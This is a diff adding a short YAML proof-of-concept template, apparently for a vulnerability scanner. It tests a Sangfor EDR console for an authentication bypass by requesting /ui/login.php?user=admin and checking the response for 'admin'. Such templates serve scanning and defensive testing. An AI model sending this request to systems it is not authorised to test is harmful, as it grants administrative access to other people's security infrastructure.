@@ -1,0 +1,9 @@
+name: poc-yaml-sangfor-anguserlogin
+rules:
+  - method: GET
+    path: /ui/login.php?user=admin
+    expression: response.status == 200 && response.body.bcontains(admin)
+detail:
+  author: Facker007(https://github.com/Facker007)
+  links:
+    - https://edr.sangfor.com.cn/
